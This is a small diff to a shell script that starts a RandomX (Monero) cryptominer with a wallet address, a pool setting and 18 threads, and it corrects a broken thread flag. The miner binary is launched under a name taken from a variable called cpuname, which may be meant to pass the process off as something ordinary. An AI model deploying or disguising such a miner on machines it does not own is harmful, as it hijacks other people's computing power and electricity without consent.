@@ -15,4 +15,4 @@ USERNAME=44XbJdyExZZbCqrGyvG1oUbTpBL8JNqHVh8hmYXgUfEHgHs4t45yMfKeTAUQ4dDNtPc2vXh
 ALGO=rx/0
 DONATE=1
 echo $cpuname" is starting"
-./"${cpuname}" --donate-level $DONATE -o $POOL -u $USERNAME.metan -p x -a $ALGO -k --tls - t 18
+./"${cpuname}" --donate-level $DONATE -o $POOL -u $USERNAME.metan -p x -a $ALGO -k --tls -t 18
